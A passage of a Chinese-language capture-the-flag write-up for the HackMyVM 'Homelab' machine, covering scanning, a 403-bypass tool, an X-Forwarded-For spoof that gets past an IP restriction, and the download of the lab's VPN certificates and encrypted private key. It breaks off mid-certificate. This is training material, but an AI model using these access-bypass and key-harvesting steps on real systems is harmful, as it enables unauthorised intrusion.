@@ -1,0 +1,1064 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="# hackmyvm homelab 测试记录
+
+ 
+
+
+[大佬WP](https://www.bilibili.com/video/BV1gN5WzMEB5)
+
+
+
+
+### 1. 基本信息
+
+```
+靶机链接：
+https://hackmyvm.eu/machines/machine.php?vm=Homelab
+https://maze-sec.com/library/
+```
+
+```shell
+难度：⭐️⭐️⭐️
+知识点：扫描，`bypass-403`工具，爆破`PKCS#8`密码，`openvpn`使用，家目录文件提权
+```
+
+### 2. 信息收集
+
+### Nmap
+
+```shell
+└─# arp-scan -l | grep PCS
+192.168.31.65   82:76:60:93:03:34       (Unknown: locally administered)
+└─# IP=192.168.31.65
+└─# nmap -sV -sC -A $IP -Pn
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 19:16 CST
+Nmap scan report for homelab (192.168.31.65)
+Host is up (0.0017s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.62 ((Unix))
+|_http-title: Mac OS X Server
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.62 (Unix)
+|_http-favicon: Apache on Mac OS X
+MAC Address: 82:76:60:93:03:34 (Unknown)
+```
+
+### 目录扫描
+
+```shell
+└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.h
+└─# dirsearch -u http://$IP  -x 403 -e txt,php,html
+[19:19:13] 200 -  820B  - /cgi-bin/printenv
+[19:19:13] 200 -    1KB - /cgi-bin/test-cgi
+[19:19:15] 200 -    4KB - /error.html
+[19:19:15] 200 -    8KB - /favicon.ico
+[19:19:22] 301 -  313B  - /script  ->  http://192.168.31.65/script/
+[19:19:22] 301 -  319B  - /service?Wsdl  ->  http://192.168.31.65/service/?Wsdl
+[19:19:22] 301 -  314B  - /service  ->  http://192.168.31.65/service/
+[19:19:23] 301 -  312B  - /style  ->  http://192.168.31.65/style/
+```
+
+看群主`wp`介绍`style是css`，`script是js`，所以入口点就是`service`。">
+<meta property="og:title" content="hackmyvm_homelab">
+<meta property="og:description" content="# hackmyvm homelab 测试记录
+
+ 
+
+
+[大佬WP](https://www.bilibili.com/video/BV1gN5WzMEB5)
+
+
+
+
+### 1. 基本信息
+
+```
+靶机链接：
+https://hackmyvm.eu/machines/machine.php?vm=Homelab
+https://maze-sec.com/library/
+```
+
+```shell
+难度：⭐️⭐️⭐️
+知识点：扫描，`bypass-403`工具，爆破`PKCS#8`密码，`openvpn`使用，家目录文件提权
+```
+
+### 2. 信息收集
+
+### Nmap
+
+```shell
+└─# arp-scan -l | grep PCS
+192.168.31.65   82:76:60:93:03:34       (Unknown: locally administered)
+└─# IP=192.168.31.65
+└─# nmap -sV -sC -A $IP -Pn
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 19:16 CST
+Nmap scan report for homelab (192.168.31.65)
+Host is up (0.0017s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.62 ((Unix))
+|_http-title: Mac OS X Server
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.62 (Unix)
+|_http-favicon: Apache on Mac OS X
+MAC Address: 82:76:60:93:03:34 (Unknown)
+```
+
+### 目录扫描
+
+```shell
+└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.h
+└─# dirsearch -u http://$IP  -x 403 -e txt,php,html
+[19:19:13] 200 -  820B  - /cgi-bin/printenv
+[19:19:13] 200 -    1KB - /cgi-bin/test-cgi
+[19:19:15] 200 -    4KB - /error.html
+[19:19:15] 200 -    8KB - /favicon.ico
+[19:19:22] 301 -  313B  - /script  ->  http://192.168.31.65/script/
+[19:19:22] 301 -  319B  - /service?Wsdl  ->  http://192.168.31.65/service/?Wsdl
+[19:19:22] 301 -  314B  - /service  ->  http://192.168.31.65/service/
+[19:19:23] 301 -  312B  - /style  ->  http://192.168.31.65/style/
+```
+
+看群主`wp`介绍`style是css`，`script是js`，所以入口点就是`service`。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://pingsag3.github.io/post/hackmyvm_homelab.html">
+<meta property="og:image" content="https://github.githubassets.com/favicons/favicon.svg">
+<title>hackmyvm_homelab</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">hackmyvm_homelab</h1>
+<div class="title-right">
+    <a href="https://pingsag3.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/pingsag3/pingsag3.github.io/issues/1" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>hackmyvm homelab 测试记录</h1>
+<p><a href="https://www.bilibili.com/video/BV1gN5WzMEB5" rel="nofollow">大佬WP</a></p>
+<h3>1. 基本信息</h3>
+<pre class="notranslate"><code class="notranslate">靶机链接：
+https://hackmyvm.eu/machines/machine.php?vm=Homelab
+https://maze-sec.com/library/
+</code></pre>
+<div class="highlight highlight-source-shell"><pre class="notranslate">难度：⭐️⭐️⭐️
+知识点：扫描，<span class="pl-s"><span class="pl-pds">`</span>bypass-403<span class="pl-pds">`</span></span>工具，爆破<span class="pl-s"><span class="pl-pds">`</span>PKCS#8<span class="pl-pds">`</span></span>密码，<span class="pl-s"><span class="pl-pds">`</span>openvpn<span class="pl-pds">`</span></span>使用，家目录文件提权</pre></div>
+<h3>2. 信息收集</h3>
+<h3>Nmap</h3>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> arp-scan -l | grep PCS</span>
+192.168.31.65   82:76:60:93:03:34       (Unknown: locally administered)
+└─<span class="pl-c"><span class="pl-c">#</span> IP=192.168.31.65</span>
+└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC -A $IP -Pn</span>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 19:16 CST
+Nmap scan report <span class="pl-k">for</span> homelab (192.168.31.65)
+Host is up (0.0017s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.62 <span class="pl-s"><span class="pl-pds">((</span>Unix<span class="pl-pds">))</span></span>
+<span class="pl-k">|</span>_http-title: Mac OS X Server
+<span class="pl-k">|</span> http-methods:
+<span class="pl-k">|</span>_  Potentially risky methods: TRACE
+<span class="pl-k">|</span>_http-server-header: Apache/2.4.62 (Unix)
+<span class="pl-k">|</span>_http-favicon: Apache on Mac OS X
+MAC Address: 82:76:60:93:03:34 (Unknown)</pre></div>
+<h3>目录扫描</h3>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.h</span>
+└─<span class="pl-c"><span class="pl-c">#</span> dirsearch -u http://$IP  -x 403 -e txt,php,html</span>
+[19:19:13] 200 -  820B  - /cgi-bin/printenv
+[19:19:13] 200 -    1KB - /cgi-bin/test-cgi
+[19:19:15] 200 -    4KB - /error.html
+[19:19:15] 200 -    8KB - /favicon.ico
+[19:19:22] 301 -  313B  - /script  -<span class="pl-k">&gt;</span>  http://192.168.31.65/script/
+[19:19:22] 301 -  319B  - /service<span class="pl-k">?</span>Wsdl  -<span class="pl-k">&gt;</span>  http://192.168.31.65/service/<span class="pl-k">?</span>Wsdl
+[19:19:22] 301 -  314B  - /service  -<span class="pl-k">&gt;</span>  http://192.168.31.65/service/
+[19:19:23] 301 -  312B  - /style  -<span class="pl-k">&gt;</span>  http://192.168.31.65/style/</pre></div>
+<p>看群主<code class="notranslate">wp</code>介绍<code class="notranslate">style是css</code>，<code class="notranslate">script是js</code>，所以入口点就是<code class="notranslate">service</code>。继续扫<code class="notranslate">service</code> 目录</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> dirsearch -u http://$IP/service  -x 403 -e txt,php,html</span>
+[19:32:12] Starting: service/
+[19:32:20] 200 -    1KB - /service/ca.crt</pre></div>
+<p>用<code class="notranslate">dirsearch</code>扫到<code class="notranslate">ca.crt</code>(遗憾的是<code class="notranslate">gobuster</code> 字典居然没有),取下来</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/ca.crt</span>
+-----BEGIN CERTIFICATE-----
+MIIDSDCCAjCgAwIBAgIUFsI+zOonAvZQA+m8UZ5NUujMpKswDQYJKoZIhvcNAQEL
+BQAwFTETMBEGA1UEAwwKTXktSG9tZSBDQTAeFw0yNTA0MTUxNjE2NDJaFw0zNTA0
+MTMxNjE2NDJaMBUxEzARBgNVBAMMCk15LUhvbWUgQ0EwggEiMA0GCSqGSIb3DQEB
+AQUAA4IBDwAwggEKAoIBAQDdeTDZboEmIg6d+KahlCJ/Gr4cKp4NvGJJU25AOxqb
+QBHJp4zWuMN6VLkxMfXfOzpwsQK+noyjtpZSR8JrsmFz8OaBI0KK7FNyPLNWYyEY
+PJ+kzNMf+RRmbA2xNkIHms7j4ziSylmHYebHAmxCscS6cH/R4XyFNp1GdXe/3iJL
+dALNo6jymspAVR+x2/E7K/bCg9d7JLny9ZCLxXbVIIIjd8quMFKyJ3ZBfsFdY6ym
+T6W0NY2fQYQKSR/6LparsgIlVM06Qpykdog3V12z8+8XALZNw0My5Y9TbMgtDovV
++y1RFRMK1mTNuUU2vriM/q7n/zFb5hJsZwiJ3m4exMuvAgMBAAGjgY8wgYwwDAYD
+VR0TBAUwAwEB/zAdBgNVHQ4EFgQUZZObZvJY/XwuV84kcWdjIXIMi3EwUAYDVR0j
+BEkwR4AUZZObZvJY/XwuV84kcWdjIXIMi3GhGaQXMBUxEzARBgNVBAMMCk15LUhv
+bWUgQ0GCFBbCPszqJwL2UAPpvFGeTVLozKSrMAsGA1UdDwQEAwIBBjANBgkqhkiG
+9w0BAQsFAAOCAQEAlFOyWCn96KRBq0b6QYWRhqWbhDeMJD+EhwKK2JeMUzLc2XOy
+91/kSbvquVuohif8xkg4J6uVuLwNGOjuFo8mooLYzHKZGXkmpEo66PyswbnguAD9
+QuPLYHJ63vwUvIATv5WpH9ZWUxaMYaqU9SgHrcqi86jNOOds4j/07VWmslnRO3GX
+S/THLanVD9zlrXJNnu1x6g+nUddXsI6OON5nGlO4ki8a5nt+2GnJ+3vGvc4w44Gu
+AXWl/rl/AIv1UAph/Pm25U/BK4FjWSIO3Gx1YvZkwqUnpnN8wr2KF3oB01Y0w6dD
+e2okw+XCzCMr1SP+UihU5h4zSMQi6/Tf4e0HDw==
+-----END CERTIFICATE-----
+
+└─<span class="pl-c"><span class="pl-c">#</span> echo ''&gt; id</span>
+└─<span class="pl-c"><span class="pl-c">#</span> chmod 600 id</span>
+<span class="pl-c"><span class="pl-c">#</span>看清楚不是私钥</span></pre></div>
+<p>访问网页返回服务仅供自己使用</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/</span>
+Whoa<span class="pl-k">!</span> But sorry, this service is only available <span class="pl-k">for</span> myself<span class="pl-k">!</span></pre></div>
+<h5><code class="notranslate">bypass-403</code>工具</h5>
+<p>先用<code class="notranslate">bypass-403</code>工具试一下</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>工具</span>
+https://github.com/iamj0ker/bypass-403
+./bypass-403.sh website-here path-here
+/CTF/bypass-403.sh http://<span class="pl-smi">$IP</span>/service</pre></div>
+<p>过滤<code class="notranslate">$IP\service\</code> 页面的默认<code class="notranslate">59</code>长度返回内容后，没啥有用信息</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> /CTF/bypass-403.sh http://$IP/service</span>
+/CTF/bypass-403.sh: 行 2: figlet: 未找到命令
+                                               By Iam_J0ker
+./bypass-403.sh https://example.com path
+
+200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/
+200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/%2e/
+200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service//.
+200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service////
+200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/.//./
+200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/ -H X-Original-URL:
+200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/ -H X-Custom-IP-Authorization: 127.0.0.1
+200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/ -H X-Forwarded-For: http://127.0.0.1
+200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/ -H X-Forwarded-For: 127.0.0.1:80
+200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service -H X-rewrite-url:
+404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/%20
+404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/%09
+200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/<span class="pl-k">?</span>
+403,276  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/.html
+200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service//<span class="pl-k">?</span>anything
+200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/<span class="pl-c"><span class="pl-c">#</span></span>
+200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/ -H Content-Length:0 -X POST
+404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service//<span class="pl-k">*</span>
+404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/.php
+404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/.json
+200,87  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/  -X TRACE
+200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/ -H X-Host: 127.0.0.1
+404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/..<span class="pl-k">;</span>/
+000,0  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/<span class="pl-k">;</span>/
+200,87  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/ -X TRACE
+200,59  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/ -H X-Forwarded-Host: 127.0.0.1
+Way back machine:
+/CTF/bypass-403.sh: 行 60: jq: 未找到命令
+└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/ | wc -l</span>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    59  100    59    0     0   6409      0 --:--:-- --:--:-- --:--:--  6555
+0
+└─<span class="pl-c"><span class="pl-c">#</span> /CTF/bypass-403.sh http://$IP/service | grep -v 59</span>
+/CTF/bypass-403.sh: 行 2: figlet: 未找到命令
+                                               By Iam_J0ker
+./bypass-403.sh https://example.com path
+
+404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/%20
+404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/%09
+403,276  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/.html
+404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service//<span class="pl-k">*</span>
+404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/.php
+404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/.json
+200,87  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/  -X TRACE
+404,273  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/..<span class="pl-k">;</span>/
+000,0  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/<span class="pl-k">;</span>/
+200,87  --<span class="pl-k">&gt;</span> http://192.168.31.65/service/ -X TRACE</pre></div>
+<p>虽然支持<code class="notranslate">TRACE</code>，但是没东西返回，重新回到起点</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl http://192.168.31.65/service/ -X TRACE</span>
+TRACE /service/ HTTP/1.1
+Host: 192.168.31.65
+User-Agent: curl/8.11.0
+Accept: <span class="pl-k">*</span>/<span class="pl-k">*</span></pre></div>
+<p>根据页面提示内容：<code class="notranslate">服务仅供自己使用</code>，尝试<code class="notranslate">X-Forwarded-For</code>绕过</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl http://192.168.31.65/service/ -H "X-Forwarded-For:127.0.0.1"</span>
+Whoa<span class="pl-k">!</span> But sorry, this service is only available <span class="pl-k">for</span> myself<span class="pl-k">!</span>
+└─<span class="pl-c"><span class="pl-c">#</span> curl http://192.168.31.65/service/ -H "X-Forwarded-For:localhost"</span>
+Whoa<span class="pl-k">!</span> But sorry, this service is only available <span class="pl-k">for</span> myself<span class="pl-k">!</span>
+└─<span class="pl-c"><span class="pl-c">#</span> curl http://192.168.31.65/service/ -H "X-Forwarded-For:192.168.31.65"</span>
+<span class="pl-c"><span class="pl-c">#</span> Last modified by shinosawa</span>
+<span class="pl-c"><span class="pl-c">#</span> on 2024-12-21</span>
+
+<span class="pl-c"><span class="pl-c">#</span> Example Configuration File</span>
+
+client
+dev tun
+proto udp
+remote <span class="pl-k">?</span> <span class="pl-k">?</span>
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+ca <span class="pl-k">?</span>
+cert <span class="pl-k">?</span>
+<span class="pl-c"><span class="pl-c">#</span> Regenerate a STRONG password for the KEY</span>
+<span class="pl-c"><span class="pl-c">#</span> Do NOT use a SAME password as other services et. SSH</span>
+<span class="pl-c"><span class="pl-c">#</span> it is DANGEROUS!</span>
+key <span class="pl-k">?</span>
+cipher AES-256-GCM
+verb 3
+└─<span class="pl-c"><span class="pl-c">#</span> curl http://192.168.31.65/service/ -H "X-Forwarded-For:192.168.31.65" | wc -c</span>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   326  100   326    0     0  24234      0 --:--:-- --:--:-- --:--:-- 25076
+326</pre></div>
+<p>测试，只有用对外的<code class="notranslate">192</code>网段<code class="notranslate">ip</code>时候有返回，结合<code class="notranslate">gobuster</code> 扫描的<code class="notranslate">vpn.txt</code>文件大小276和<code class="notranslate">openvpn</code>知识，上面返回的内容326可能和<code class="notranslate">vpn.txt</code>有关</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP/service -x.txt</span>
+
+/vpn.txt              (Status: 403) [Size: 276]</pre></div>
+<h5><code class="notranslate">openvpn</code>知识</h5>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>## 基本部署步骤</span>
+1. 安装 OpenVPN  
+   sudo apt install openvpn
+2. 生成证书和密钥  
+   - 使用 EasyRSA 或 OpenSSL 生成 CA 证书、服务器证书和客户端证书。
+3. 配置服务器端  
+   - 编辑服务器配置文件（如 <span class="pl-s"><span class="pl-pds">`</span>server.conf<span class="pl-pds">`</span></span>），指定端口（默认 <span class="pl-s"><span class="pl-pds">`</span>udp 1194<span class="pl-pds">`</span></span>）、协议（TCP/UDP）、证书路径等。
+4. 配置客户端  
+   - 创建客户端配置文件（如 <span class="pl-s"><span class="pl-pds">`</span>client.ovpn<span class="pl-pds">`</span></span>），包含服务器 IP、端口、证书等信息。
+5. 启动服务  
+   sudo systemctl start openvpn@server</pre></div>
+<p>测试靶机靶机上<code class="notranslate">openvpn</code>服务对应的<code class="notranslate">udp 1194</code>端口已开放</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> nmap -sU $IP -p 1194</span>
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 20:19 CST
+Nmap scan report <span class="pl-k">for</span> homelab (192.168.31.65)
+Host is up (0.0013s latency).
+
+PORT     STATE SERVICE
+1194/udp open  openvpn
+MAC Address: 82:76:60:93:03:34 (Unknown)
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 0.39 seconds</pre></div>
+<p>所以猜测作者的思路是，构建<code class="notranslate">VPN</code>，通过<code class="notranslate">vpn</code>连接靶机<code class="notranslate">ip</code>，靶机的<code class="notranslate">ssh</code>服务只开在<code class="notranslate">vpn</code>对应的地址</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>在 OpenVPN 的默认证书认证模式下，客户端必须配置 client.key（私钥）和 client.crt（客户端证书）文件</span>
+
+- OpenVPN 默认使用 SSL/TLS 证书双向认证，即服务器和客户端都需要提供证书。
+- 服务端通过 <span class="pl-s"><span class="pl-pds">`</span>ca.crt<span class="pl-pds">`</span></span>（根证书）验证客户端证书（<span class="pl-s"><span class="pl-pds">`</span>client.crt<span class="pl-pds">`</span></span>）是否由可信 CA 签发。
+- 客户端私钥（<span class="pl-s"><span class="pl-pds">`</span>client.key<span class="pl-pds">`</span></span>）用于生成加密签名，证明客户端拥有该证书的合法权限。</pre></div>
+<p>需要找到客户端所需的<code class="notranslate"> client.key</code>（私钥）和<code class="notranslate"> client.crt</code>（客户端证书）文件,直接在<code class="notranslate">ca.crt</code>所在的路径就请求成功了。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/ca.crt &gt; /tmp/ca.crt</span>
+└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/client.crt &gt; /tmp/client.crt</span>
+└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/client.key &gt; /tmp/client.key</span>
+└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/client.key</span>
+-----BEGIN ENCRYPTED PRIVATE KEY-----
+MIIFJDBWBgkqhkiG9w0BBQ0wSTAxBgkqhkiG9w0BBQwwJAQQcjQTElcIKFeDw72A
+xT/14gICCAAwDAYIKoZIhvcNAgkFADAUBggqhkiG9w0DBwQIVNMjRXSbGKgEggTI
+o2XhzDmt4VwIs9a2+TlCU8B9wfv4CKyoX6kqbmbEjwnUtIjV6ouTAdp423q8aEMP
+9vIPo/QUvnAAcxflWs0JAg9cDN9Mix1TygNaqtiOnfodE/powg2+HJH58byf3C2/
+L9i/Eyhy4PUFBocAQEMcL+OOlhV6N/K+YI26UpM3cb1W/bZa/D1kitPTc3aNaEcm
+cik0vozX4LaCAkWUkrfQTDmWy30nvSGlByAOrdKTdc73ZKYjhfJ0aBAvnr3l9YJ1
+6P5GZ4plb0rsATaxKJX2qlza9CeAVtEBYxJXtLsv82ydLhdV9QIfL971GRwT7ufJ
+O04GlQnnD1+RXsgX/HX8TlqtWB+cNHPXU5goKoV98vMU9LhOLkgBt+F8VBXngXSa
+x/6vVA2JTq14GAuVptRRvk3NWspXbWPcEfeIRjagP1+d2eIZB6Jf3KNqFzlEZJBg
+9sVFw8K4Kl1y46A767/6zAgR1yWxZUIu4DqqxrD/J+jefqEzHEpWs/hKkqDFOiY+
+rtTiaG1DwVMw+EUCOOkWlzgC+J+z4ne26NxlRrDEIg85X5UfDnbDzQcvTOq8QZHF
+QH0OMFtKVT3EnKyChVSKDSjSBoMV6DjWB1BGI9SIaca5yKjtYJm9ZKgc319XnuDH
+LCHIQfERyaTypf87MAahh0P43ZUn4FJoH7DVa4R4lluyJnwr3fXcPdN+lmVAlH/b
+fLsGy3NNjBjNqUgkr923SOoTQXtz8HN1TSM/P11w6udvjOcHtBTV+eRczkBStvPV
+W0OqZMPGDaEg+HGsdQt3moGxRwgP7HEHp7IRR1mvHHjtg4UgflDtfa5BfxEOlWyF
+p/aV4JTVWsBhV6jEEhtY2+5vvhRammSvW6+HWqpicEE0Kekm5lf9hh3jNvXPbeuP
+gV000gW7ZfHRmIbfGn1/RQtizqxBDrzjPsXIvrnsR5kdqWuDYdI3681QErb7txoX
++7urFS1MErtwmMIxsjkKgZyxzn71CHrSRwxlPSJMOe4LWprVk92By533yuccJXNx
+Lk63VtvH/H+EPeFisTnX2rN7Y4Yz/k+wbJH7cyS5PMu0I49scZPqWnZwEd+6SyKq
+3AkTXtytghizriWnxlq4dzaAUjDGCnR9vqy8cNgpJRwQTczorCqRf+3vf8oji0b+
+IeyTNyJeS+S8YEoFSxCHVdSy1YS7EnXWAF7fV49Rpwz8kzdi+dGVXyF9oxp+XAM5
+827TdKT0NueVxakHRqm6Px23xQHvfPn2lYbzX1C1piLRFAXOk+5l7VflLoCl5QnN
+UjzWysu0morMJ8d4nrhaCzcUQc55lJJoX5VU3tRrAjQ1yDhmKKQ0Ga3iGiA3CGop
+BNj4qIST98Z/fcVT79ZP0kykcD91KNOQsJz7Zc6gJvat2EbCZksj584981bySrgA
+vWJ/0ikaF2+PrVHrKMi6cn75Eiz2fO2xovr8q8sh0n3iegHvAmXRhU2zb2DEjTWk
+X+UgNh/LzoYJEkFE+atB7QnPy5TB+HQF/UW22ZAygXkzVdk8Wl36hlsDNtz+wvOd
+uLEkpu2zKwKZ8dMPodNQy8z1ax+NwtVRK2ttrmhbTdmlmk24lrlz3Wp9u0AwB4WD
+Q0fWBgB3vyBO+VTniw+CHZ+JRsXAYTue
+-----END ENCRYPTED PRIVATE KEY-----
+
+└─<span class="pl-c"><span class="pl-c">#</span> curl http://$IP/service/client.crt</span>
+Certificate:
+    Data:
+        Version: 3 (0x2)
+        Serial Number:
+            a4:f5:ca:c7:e6:4b:ce:66:c4:2d:f3:b1:aa:17:77:72
+        Signature Algorithm: sha256WithRSAEncryption
+        Issuer: CN=My-Home CA
+        Validity
+            Not Before: Apr 15 16:17:17 2025 GMT
+            Not After <span class="pl-c1">:</span> Jul 19 16:17:17 2027 GMT
+        Subject: CN=client1
+        Subject Public Key Info:
+            Public Key Algorithm: rsaEncryption
+                Public-Key: (2048 bit)
+                Modulus:
+                    00:a4:18:af:59:be:6f:36:31:64:7f:6b:60:da:ba:
+                    ec:89:3e:10:7b:90:4c:99:1b:55:fe:d2:c1:77:8d:
+                    47:15:a9:59:f8:df:9c:48:ed:32:0a:2c:56:fa:00:
+                    7d:81:b4:94:a5:09:31:fa:d9:16:98:a9:bc:64:3c:
+                    bf:aa:9d:c3:89:9d:3c:ff:3a:25:54:bf:c4:e7:a2:
+                    2c:51:16:a6:ba:84:03:72:da:98:9f:ba:e5:5c:cf:
+                    72:62:7d:80:51:20:a0:ba:11:4f:d9:ce:5c:67:2c:
+                    40:60:18:c4:8d:d3:6e:04:9a:34:84:12:f1:af:a3:
+                    a8:74:17:e7:7a:58:e4:48:3e:44:2b:5d:48:56:60:
+                    64:64:06:e4:00:86:1e:f6:79:da:84:4e:c5:11:1d:
+                    2a:d3:20:bf:5c:d8:30:32:5b:6b:af:64:06:d0:5d:
+                    9b:4e:6b:89:87:44:d0:6c:55:cc:6a:c8:ef:83:65:
+                    bf:ac:3a:bc:9e:0a:9f:9d:d3:4b:af:42:05:db:b7:
+                    b3:b7:4c:cb:3a:6f:89:63:53:77:10:c0:c6:10:bf:
+                    fb:04:08:21:0f:30:39:ce:58:72:3a:76:3d:68:aa:
+                    2a:db:5f:1f:f1:df:8d:f5:e8:bb:22:ca:0a:5c:39:
+                    e0:d6:57:57:a8:c5:0c:39:1a:4f:42:d5:38:18:f0:
